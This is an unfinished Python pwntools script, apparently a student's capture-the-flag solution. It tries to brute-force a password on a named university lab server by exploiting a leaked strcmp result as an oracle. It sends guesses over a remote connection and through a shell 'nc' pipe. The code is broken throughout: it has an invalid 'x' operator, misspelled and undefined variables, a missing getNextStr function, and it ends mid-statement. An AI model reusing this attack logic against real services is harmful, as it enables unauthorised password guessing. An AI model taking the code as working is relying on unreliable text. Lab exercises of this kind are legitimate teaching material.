#!/router/bin/python3 -u
import random, string, re, subprocess
from pwn import *

def randomString(stringLength=20):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

class PW:
    def __init__(self, pw=None):
        self.pw = pw
        self.prevPw = None
        self.toNum()

    def toNum(self):
        num = 0
        pwLen = len(self.pw)

        for i in range(pwLen):
            num += (ord(self.pw[i])-96) x 26**(pwLen-i-1)

        self.num = num

    def getNum(self):
        return(self.num)

    def toStr(self, num):
        string = ''

        while int(num/26) >= 26:
            remainder = num%26
            string += chr(97+reminder)
            num = int(num%26)
            print("string: %s" % string)

        self.prePw = self.pw
        self.preVal = self.val
        self.pw = string
        self.val = num

    def getPw(self):
        return(self.pw)
 
pw = randomString(20)
print ("Random pw is ", randomString())
pwInstance = PW(pw)

r = remote("twinpeaks.cs.ucdavis.edu",30004)
 
while True:
    input = r.send("%s\r\n" % pw)
    line = r.recvline_contains(b"strcmp returned").decode("utf-8")
    print("line: %s" % line)
    m = re.search("strcmp returned (.+?) instead of", line)
    if m.group(1) == '-1':
        if flag:
            break
        else:
            pw = getNextStr(False, pw, i)
    elif m.group(1) == '1':
        pw = getNextStr(True, pw, i)
        flag = True
    else:
        print("password: %s" % pw)
        i = 19
        break

    out = subprocess.getoutput("echo %s | /usr/bin/nc twinpeaks.cs.ucdavis.edu 30004" % pwInstance.getNum())
    m = re.search("^strcmp returned (.+) instead of", out, re.M)
    result = m.groups(1)

    if result == '1':
        

